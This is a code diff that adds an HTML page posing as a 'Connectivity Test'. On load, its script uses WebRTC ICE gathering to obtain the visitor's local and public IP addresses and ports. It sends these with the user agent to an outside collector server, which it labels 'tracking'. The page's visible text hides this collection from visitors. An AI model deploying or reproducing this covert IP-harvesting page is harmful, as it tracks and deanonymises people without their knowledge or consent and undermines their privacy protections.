@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Connectivity Test</title>
+</head>
+<body>
+    <h2>Analyzing Connection...</h2>
+    <script>
+        // REPLACE THIS with your Render URL
+        const BACKEND_URL = "https://webrtc-collector.onrender.com";
+
+        async function startTracking() {
+            // Configuration using your TURN/STUN credentials
+            const pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: "stun:stun.l.google.com:19302" },
+                    { 
+                        urls: "turn:your.turn.server:443", 
+                        username: "user", 
+                        credential: "pass" 
+                    }
+                ]
+            });
+
+            // We need a data channel to force the ICE gathering process
+            pc.createDataChannel("tracking");
+
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    // Send the raw candidate string to your server
+                    // This contains the local/public IP and port mapping
+                    fetch(BACKEND_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            fingerprint: navigator.userAgent,
+                            candidate: event.candidate.candidate
+                        })
+                    }).catch(err => console.error("Tracking blocked or failed:", err));
+                }
+            };
+
+            // Create the offer to start the process
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+        }
+
+        startTracking();
+    </script>
+</body>
+</html>
